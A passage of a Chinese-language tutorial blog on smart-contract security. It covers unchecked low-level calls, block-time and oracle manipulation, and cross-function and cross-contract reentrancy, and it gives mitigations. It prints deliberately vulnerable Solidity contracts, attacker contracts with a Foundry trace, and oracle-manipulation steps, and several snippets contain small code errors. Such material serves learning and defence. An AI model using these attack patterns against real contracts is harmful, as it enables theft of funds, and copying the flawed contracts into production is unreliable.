class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UncheckedBank &#123;<br>    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping<br><br>    // 存入ether，并更新余额<br>    function deposit() external payable &#123;<br>        balanceOf[msg.sender] += msg.value;<br>    &#125;<br><br>    // 提取msg.sender的全部ether<br>    function withdraw() external &#123;<br>        // 获取余额<br>        uint256 balance = balanceOf[msg.sender];<br>        require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>        balanceOf[msg.sender] = 0;<br>        // Unchecked low-level call<br>        bool success = payable(msg.sender).send(balance);<br>    &#125;<br><br>    // 获取银行合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="攻击合约-2"><a href="#攻击合约-2" class="headerlink" title="攻击合约"></a>攻击合约</h2><p>我们构造了一个攻击合约，它刻画了一个倒霉的储户，取款失败但是银行余额清零：合约回调函数 <code>receive()</code> 中的 <code>revert()</code> 将回滚交易，因此它无法接收 <code>ETH</code>；但是提款函数 <code>withdraw()</code> 却能正常调用，清空余额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UncheckedAttack &#123;<br>    UncheckedBank public bank; // Bank合约地址<br>    // 初始化Bank合约地址<br>    constructor(UncheckedBank _bank) &#123;<br>        bank = _bank;<br>    &#125;<br>    // 回调函数，转账ETH时会失败<br>    receive() external payable &#123;<br>        revert();<br>    &#125;<br>    // 存款函数，调用时 msg.value 设为存款数量<br>    function deposit() external payable &#123;<br>        bank.deposit&#123;value: msg.value&#125;();<br>    &#125;<br>    // 取款函数，虽然调用成功，但实际上取款失败<br>    function withdraw() external payable &#123;<br>        bank.withdraw();<br>    &#125;<br>    // 获取本合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UncheckedAttackTest is Test &#123;<br>    UncheckedBank public bank;<br>    UncheckedAttack public attack;<br>    function setUp() public &#123;<br>        bank = new UncheckedBank(); // 部署Bank合约<br>        vm.deal(address(this), 1000 * 1e18);<br>//        bank.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        attack = new UncheckedAttack(bank); // 部署攻击合约<br>    &#125;<br>    function test_attack() public &#123;<br>        // 攻击执行<br>        attack.deposit&#123;value: 1 * 1e18&#125;();<br>        uint256 balancesAfter = attack.getBalance(); // 但是我仍然没有收到这个余额，提款失败了<br>        console.log(&quot;balances After  is &quot;, balancesAfter);<br>        bank.balanceOf(address(attack)); // 有1 ETH<br><br>        attack.withdraw();//提款，提款失败了，但是我的余额也没有了<br><br>        bank.balanceOf(address(attack)); //没了<br>        uint256 balancesBefore = attack.getBalance(); // 但是我仍然没有收到这个余额，提款失败了<br>        console.log(&quot;balances Before   is &quot;, balancesBefore);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">Traces:<br>  [66787] UncheckedAttackTest::test_attack()<br>    ├─ [34398] UncheckedAttack::deposit&#123;value: 1000000000000000000&#125;()<br>    │   ├─ [22559] UncheckedBank::deposit&#123;value: 1000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [312] UncheckedAttack::getBalance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;balances After  is &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [823] UncheckedBank::balanceOf(UncheckedAttack: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]<br>    │   └─ ← [Return] 1000000000000000000 [1e18]<br>    ├─ [8083] UncheckedAttack::withdraw()<br>    │   ├─ [7493] UncheckedBank::withdraw()<br>    │   │   ├─ [45] UncheckedAttack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   └─ ← [Revert] EvmError: Revert<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [823] UncheckedBank::balanceOf(UncheckedAttack: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall] //余额没了<br>    │   └─ ← [Return] 0<br>    ├─ [312] UncheckedAttack::getBalance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;balances Before   is &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure><h2 id="预防办法-5"><a href="#预防办法-5" class="headerlink" title="预防办法"></a>预防办法</h2><p>你可以使用以下几种方法来预防未检查低级调用的漏洞：</p><ol><li><p>检查低级调用的返回值，在上面的银行合约中，我们可以改正 <code>withdraw()</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bool success = payable(msg.sender).send(balance);<br>require(success, &quot;Failed Sending ETH!&quot;)<br></code></pre></td></tr></table></figure></li><li><p>合约转账<code>ETH</code>时，使用 <code>call()</code>，并做好重入保护。</p></li><li><p>使用<code>OpenZeppelin</code>的<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol">Address库</a>，它将检查返回值的低级调用封装好了。</p></li></ol><h1 id="S14-操纵区块时间"><a href="#S14-操纵区块时间" class="headerlink" title="S14. 操纵区块时间"></a>S14. 操纵区块时间</h1><p>以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。</p><h2 id="区块时间"><a href="#区块时间" class="headerlink" title="区块时间"></a>区块时间</h2><p>区块时间（block timestamp）是包含在以太坊区块头中的一个 <code>uint64</code> 值，代表此区块创建的 UTC 时间戳（单位：秒），在合并（The Merge）之前，以太坊会根据算力调整区块难度，因此出块时间不定，平均 14.5s 出一个区块，矿工可以操纵区块时间；合并之后，改为固定 12s 一个区块，验证节点不能操纵区块时间。</p><p>在 Solidity 中，开发者可以通过全局变量 <code>block.timestamp</code> 获取当前区块的时间戳，类型为 <code>uint256</code>。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了智能合约的操纵区块时间攻击，并使用 Foundry 复现了它。在合并（The Merge）之前，以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。合并之后，以太坊改为固定 12s 一个区块，并且验证节点不能操纵区块时间。因此这类攻击不会在以太坊上发生，但仍可能在其他公链中遇到。</p><h1 id="S15-操纵预言机"><a href="#S15-操纵预言机" class="headerlink" title="S15. 操纵预言机"></a>S15. 操纵预言机</h1><h2 id="价格预言机"><a href="#价格预言机" class="headerlink" title="价格预言机"></a>价格预言机</h2><p>出于安全性的考虑，以太坊虚拟机（EVM）是一个封闭孤立的沙盒。在EVM上运行的智能合约可以接触链上信息，但无法主动和外界沟通获取链下信息。但是，这类信息对去中心化应用非常重要。</p><p>预言机（oracle）可以帮助我们解决这个问题，它从链下数据源获得信息，并将其添加到链上，供智能合约使用。</p><p>其中最常用的就是价格预言机（price oracle），它可以指代任何可以让你查询币价的数据源。典型用例：</p><ul><li>去中心借贷平台（AAVE）使用它来确定借款人是否已达到清算阈值。</li><li>合成资产平台（Synthetix）使用它来确定资产最新价格，并支持 0 滑点交易。</li><li>MakerDAO使用它来确定抵押品的价格，并铸造相应的稳定币 $DAI。</li></ul><p><strong>在很多场景下，都需要知道代币的当前价格，比如说你给我1颗BTC我给你当前BTC同等价值的USDT，这个价格怎么来呢？只能从价格预言机里来，如果找到了这个合约所依赖的价格预言机来源（比如说某个池Uniswapv2的池子的当前储备量：USDT&lt;&#x3D;&#x3D;&gt;wBTC），且操控了预言机，是不是就可以以更少的BTC换到更多的USDT了？</strong></p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>我们针对有漏洞的价格预言机 <code>getPrice()</code> 函数进行攻击，步骤：</p><ol><li>准备一些 <code>BUSD</code>，可以是自有资金，也可以是闪电贷借款。在实现中，我们利用 Foundry 的 <code>deal</code> cheatcode 在本地网络上给自己铸造了 <code>1_000_000 BUSD</code></li><li>在 UniswapV2 的 <code>WETH-BUSD</code> 池中使用<code>BUSD</code>大量买入 <code>WETH</code>。具体实现见攻击代码的 <code>swapBUSDtoWETH()</code> 函数。</li><li>在此情况下，<code>WETH-BUSD</code>池中代币对比例失去了平衡，<code>WETH</code> 瞬时价格暴涨，这时我们调用 <code>swap()</code> 函数将 <code>ETH</code> 转换为 <code>oUSD</code>。</li><li><strong>可选:</strong> 在 UniswapV2 的 <code>WETH-BUSD</code> 池中卖出第2步买入的 <code>WETH</code>，收回本金。</li></ol><h2 id="预防方法-2"><a href="#预防方法-2" class="headerlink" title="预防方法"></a>预防方法</h2><p>知名区块链安全专家 <code>samczsun</code> 在一篇<a href="https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle">博客</a>中总结了预言机操纵的预防方法，这里总结一下：</p><ol><li>不要使用流动性差的池子做价格预言机。</li><li>不要使用现货&#x2F;瞬时价格做价格预言机，要加入价格延迟，例如时间加权平均价格（TWAP）。</li><li>使用去中心化的预言机。</li><li>使用多个数据源，每次选取最接近价格中位数的几个作为预言机，避免极端情况。</li><li>在使用Oracle预言机的询价方法如<code>latestRoundData()</code>，需要对返回结果进行校验，防止使用过时失效数据。</li><li>仔细阅读第三方价格预言机的使用文档及参数设置。</li></ol><h1 id="S16-NFT重入攻击"><a href="#S16-NFT重入攻击" class="headerlink" title="S16. NFT重入攻击"></a>S16. NFT重入攻击</h1><p>——-空一下</p><h1 id="S17-“跨服”重入攻击"><a href="#S17-“跨服”重入攻击" class="headerlink" title="S17. “跨服”重入攻击"></a>S17. “跨服”重入攻击</h1><p>在智能合约安全领域，重入攻击永远是一个备受关注的话题。在<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/S01_ReentrancyAttack/readme.md">重入攻击</a>这一讲中，<code>0xAA</code>生动展示了教科书级经典的重入攻击思路；而在生产环境中，常常有一些更加安排巧妙，复杂的实例一直在以各种新瓶装旧酒的面目不断地出现，并且成功地对很多项目造成了破坏。这些实例展示了攻击者如何利用智能合约中的漏洞来搭配组合出精心策划的攻击。</p><p>我们将介绍一些生产环境中真实发生的具有“跨服”属性的重入攻击案例。所谓“跨服”，是对这一类型的攻击目标的生动概括，因为它们共同的手段是从某一个函数开始入手，但是攻击对象却是其他函数&#x2F;合约&#x2F;项目等等。在本讲中我会带领大家简化并提炼其操作，探讨攻击者的思路、利用的漏洞以及对应的防御措施。通过了解这些实例，我们可以更好地理解重入攻击的本质，并且提高我们编写安全智能合约的技能和意识。</p><p>注：以下所展示的代码示例均为简化过的<code>pseudo-code</code>, 主要以阐释攻击思路为目的。内容源自众多<code>Web3 Security Researchers</code>所分享的审计案例,感谢他们的贡献！</p><h2 id="1-跨函数重入攻击"><a href="#1-跨函数重入攻击" class="headerlink" title="1. 跨函数重入攻击"></a>1. 跨函数重入攻击</h2><p><em>“那一年，我戴了重入锁，不知对手为何物。直到那天，那个男人从天而降，还是卷走了我的银钱…” – 戴锁婆婆</em></p><p>请看如下代码示例：</p><p>银行合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.17;<br><br>contract VulnerableBank &#123;<br>  mapping(address =&gt; uint256) public balances;<br><br>  uint256 private _status; // 重入锁<br><br>  // 重入锁<br>  modifier nonReentrant() &#123;<br>      // 在第一次调用 nonReentrant 时，_status 将是 0<br>       require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>      // 在此之后对 nonReentrant 的任何调用都将失败<br>      _status = 1;<br>      _;<br>      // 调用结束，将 _status 恢复为0<br>      _status = 0;<br>  &#125;<br><br>  function deposit() external payable &#123;<br>    require(msg.value &gt; 0, &quot;Deposit amount must ba greater than 0&quot;);<br>    balances[msg.sender] += msg.value;<br>  &#125;<br><br>  function withdraw(uint256 _amount) external nonReentrant &#123;<br>    uint256 balance = balances[msg.sender];<br>    require(balance &gt;= _amount, &quot;Insufficient balance&quot;);<br><br>    (bool success, ) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);//这里是转移eth必须重入锁<br>    // 这里就很巧妙，因为转账的时候会回去调用revice合约调完之后才会去下面更新 balances[msg.sender]<br>    require(success, &quot;Withdraw failed&quot;);<br><br>    balances[msg.sender] = balance - _amount;<br>  &#125;<br><br>  function transfer(address _to, uint256 _amount) external &#123;<br>    uint256 balance = balances[msg.sender];<br>    require(balance &gt;= _amount, &quot;Insufficient balance&quot;);<br><br>    balances[msg.sender] -= _amount;// 这里只是map修改，很多人以为没事的<br>    balances[_to] += _amount;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面的<code>VulnerableBank</code>合约中，可以看到转账<code>ETH</code>的步骤仅存在于<code>withdraw</code>这一个函数之内，而此函数已经使用了重入锁<code>nonReentrant</code>。那么，还有什么方法来对这个合约进行重入攻击呢？</p><p>请看如下攻击者合约示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.17;<br><br>import &quot;../IVault.sol&quot;;<br><br>contract Attack2Contract &#123;<br>    address victim;<br>    address owner;<br><br>    constructor(address _victim, address _owner) &#123;<br>        victim = _victim;<br>        owner = _owner;<br>    &#125;<br><br>    function deposit() external payable &#123;<br>        IVault(victim).deposit&#123;value: msg.value&#125;(&quot;&quot;);<br>    &#125;<br><br>    function withdraw() external &#123;<br>        Ivault(victim).withdraw();//调用withdraw合约<br>    &#125;<br>// 回调到receive合约<br>    receive() external payable &#123;<br>        uint256 balance = Ivault(victim).balances[address(this)];<br>        // 给我转账<br>        Ivault(victim).transfer(owner, balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上所示，攻击者重入的不再是<code>withdraw</code>函数，而是转头去重入没有戴锁的<code>transfer</code>函数。<code>VulnerableBank</code>合约的设计者的固有思路认为<code>transfer</code>函数中只是更改 <code>balances mapping</code>而没有转账<code>ETH</code>的步骤，所以应该不是重入攻击的对象，所以没有给它加上锁。而攻击者利用<code>withdraw</code>先将<code>ETH</code>转账，转账完成的时候<code>balances</code>没有立即更新，而随机调用了<code>transfer</code>函数将自己原本已不存在的余额成功转移给了另一个地址<code>owner</code>，而此地址完全可以是攻击者的一个小号而已。由于<code>transfer</code>函数没有转账<code>ETH</code>所以不会持续将执行权交出，所以这个重入只是攻击了额外一次便结束。结果是攻击者“无中生有”出了这一部分钱，实现了“双花”的功效。</p><p>可以这么理解：</p><blockquote><p> 0x哥在里面存了100块，然后调用提取的方法提100块，银行先给0x哥转账100块，转账会走到攻击合约的receive方法里面，在这个方法里回调银行合约的转账方法，转账方法改变balancesmap里面0x哥的余额成0，然后回去withdraw方法继续去调用balacnesmap里0x哥的余额，发现已经没有了，但是钱已经转给0x哥了，内部的balances余额却给另一个人记账了，实现了双花——-秒，秒啊</p></blockquote><p>那么问题来了：</p><p><em>如果改进一下， 将合约中的所有跟资产转移沾边的函数都加上重入锁，那是不是就安全了呢？？？</em></p><p>请看下面的进阶案例…</p><h2 id="2-跨合约重入攻击"><a href="#2-跨合约重入攻击" class="headerlink" title="2. 跨合约重入攻击"></a>2. 跨合约重入攻击</h2><p>我们的第二位受害者是一个多合约组合系统，它是一个去中心化合约交易平台，我们只看问题发生的关键处，是跟两个合约有关。第一个合约是<code>TwoStepSwapManager</code>, 它是面向用户的合约，里面包含有允许用户直接发起的提交一个swap交易的函数，还有同样是可由用户发起的，用来取消正在等待执行但尚未执行的swap交易的函数；第二个合约是<code>TwoStepSwapExecutor</code>, 它是只能由管理的角色来发起的交易，用于执行某个处于等待中的swap交易。这两个合约的 <em>部分</em> 示例代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// Contracts to create and manage swap &quot;requests&quot;<br><br>contract TwoStepSwapManager &#123;<br>    struct Swap &#123;<br>        address user;<br>        uint256 amount;<br>        address[] swapPath;<br>        bool unwrapnativeToken;<br>    &#125;<br><br>    uint256 swapNonce;<br>    mapping(uint256 =&gt; Swap) pendingSwaps;<br><br>    uint256 private _status; // 重入锁<br><br>    // 重入锁<br>    modifier nonReentrant() &#123;<br>      // 在第一次调用 nonReentrant 时，_status 将是 0<br>        require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>      // 在此之后对 nonReentrant 的任何调用都将失败<br>        _status = 1;<br>        _;<br>      // 调用结束，将 _status 恢复为0<br>        _status = 0;<br>     &#125;<br><br>    function createSwap(uint256 _amount, address[] _swapPath, bool _unwrapnativeToken) external nonReentrant &#123;<br>        IERC20(swapPath[0]).safeTransferFrom(msg.sender, _amount);<br>        pendingSwaps[++swapNounce] = Swap(&#123;<br>            user: msg.sender,<br>            amount: _amount,<br>            swapPath: _swapPath,<br>            unwrapNativeToken: _unwrapNativeToken<br>        &#125;);<br>    &#125;<br><br>    function cancelSwap(uint256 _id) external nonReentrant &#123;<br>        Swap memory swap = pendingSwaps[_id];<br>        require(swap.user == msg.sender);<br>        delete pendingSwaps[_id];<br><br>        IERC20(swapPath[0]).safeTransfer(swap.user, swap.amount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.17;<br><br>// Contract to exeute swaps<br><br>contract TwoStepSwapExecutor &#123;<br><br><br>    /* <br>        Logic to set prices etc... <br>    */<br><br><br>    uint256 private _status; // 重入锁<br><br>    // 重入锁<br>    modifier nonReentrant() &#123;<br>      // 在第一次调用 nonReentrant 时，_status 将是 0<br>        require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>      // 在此之后对 nonReentrant 的任何调用都将失败<br>        _status = 1;<br>        _;<br>      // 调用结束，将 _status 恢复为0<br>        _status = 0;<br>    &#125;<br><br>    function executeSwap(uint256 _id) external onlySwapExecutor nonReentrant &#123;<br>        Swap memory swap = ISwapManager(swapManager).pendingSwaps(_id);<br>//走到这里的时候，已经调用了重入锁，标记为1，但是进到ISwapManager的swap的时候，使用的又是ISwapManager的重入锁 ISwapManager是0呀<br>        // If a swapPath ends in WETH and unwrapNativeToken == true, send ether to the user<br>        ISwapManager(swapManager).swap(swap.user, swap.amount, swap.swapPath, swap.unwrapNativeToken);<br><br>        ISwapManager(swapManager).delete(pendingSwaps[_id]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从上面两个合约的示例代码可以看出，所有相关的函数均使用了重入锁。然而，那个男人还是成功地对戴锁婆婆施展了重入魔法，再再再一次卷走了原本不属于他的钱财。这一次，他又是如何做到的呢？</p><p>俗话说得好， <em>“灯下黑“</em> ，答案就在最表面上反而容易被忽视 — 因为这是 两 个 合 约…锁的状态是不互通的！ 管理员调用了<code>executeSwap</code>来执行了那个攻击者提交的swap，此合约的重入锁开始生效变成<code>1</code>。当运行到中间那步<code>swap（）</code>的时候，发起了<code>ETH</code>转账，将执行权交给了攻击者的恶意合约的<code>fallback</code>函数，在那里被设置了对<code>TwoStepSwapManager</code>合约的<code>cancelSwap</code>函数的调用，而此时这个合约的重入锁还是<code>0</code>，所以<code>cancelSwap</code>开始执行，此合约的重入锁开始生效变成<code>1</code>，然而为时已晚。。。 攻击者收到了<code>executeSwap</code>发送给他的swap过来的<code>ETH</code>，同时还收到了<code>cancelSwap</code>退给他的当初送出去用来swap的本金代币。他他他又一次“无中生有”了！</p><blockquote><p> 这里就很复杂，看起来是两个合约的所有的方法都加了重入锁，但其实这是两个合约，他们之间的重入锁是不互通的，但管理员调用executeSwap方法的时候，TwoStepSwapExecutor合约的重入锁被标记为1，锁住，然后进入到ISwapManager的swap方法的时候，又是ISwapManager合约的重入锁，ISwapManager还是新的呀，没有锁住，嘎嘎又被双花了</p></blockquote><h3 id="全局重入锁"><a href="#全局重入锁" class="headerlink" title="全局重入锁"></a>全局重入锁</h3><p>若想要防范这种跨合约重入攻击，我这里送同学们一个重入锁的升级版 – 全局重入锁。适合用于同学们以后架构多合约系统。请看以下简易代码思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">abstract contract GlobalReentrancyGuard&#123;<br>    uint256 private constant NOT_ENTERED = 0;//未进入<br>    uint256 private constant ENTERED = 1;//进入<br><br>    DataStore public immutable dataStore;<br><br>    constructor(DataStore _datastore) &#123;<br>        dataStore = _dataStore;<br>    &#125;<br>// 还是一个修饰符在修饰函数<br>    modifier globalNonReentrant() &#123;<br>        _nonReentrantBefore();<br>        _;<br>        _nonReentrantAfter();<br>    &#125;<br><br>    function _nonReentrantBefore() private &#123;<br>        uint256 status = dataStore.getUint(Keys.REENTRANCY_GUARD_STATUS);<br><br>        require(status == NOT_ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);<br><br>        dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, ENTERED);<br>    &#125;<br><br>    function _nonReentrantAfter() private &#123;<br>        dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, NOT_ENTERED);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一句话概括这个全局重入锁的核心就是，建立一个单独的合约用来储存重入状态，然后，在你的系统里的任何合约里相关的函数在执行的时候，都要来这同一个地方来查看当前的重入状态，这样你的所有合约就都被重入保护起来了。</p><p>看似美妙，但还没完… 攻击者还有更新的花招即便是用全局重入锁也无法防范的。接着往下看: …</p><h2 id="3-跨项目重入攻击"><a href="#3-跨项目重入攻击" class="headerlink" title="3. 跨项目重入攻击"></a>3. 跨项目重入攻击</h2><p>越写越大了。。。所谓跨项目的重入攻击，其核心与上面两例其实也是比较类似。本质就是趁某项目合约的某个状态变量在还未来得及更新时，就利用接手的执行权来发起外部函数调用。如果有第三方合作项目的合约是依赖于前面提到的项目合约里这个状态变量的值来做某些决策的，那么攻击者就可以去攻击这个合作项目的合约，因为在此刻它读到的是一个过期的状态值，会导致它执行一些错误的行为令攻击者获利。 通常，合作项目的合约通过一些<code>getter</code>函数或其他公开的只读函数的调用来传递信息，所以这类攻击也通常体现为<code>只读重入攻击 Read-Only Reentrancy</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.17;<br><br>contract VulnerableBank &#123;<br>  mapping(address =&gt; uint256) public balances;<br><br>  uint256 private _status; // 重入锁<br><br>  // 重入锁<br>  modifier nonReentrant() &#123;<br>      // 在第一次调用 nonReentrant 时，_status 将是 0<br>       require(_status == 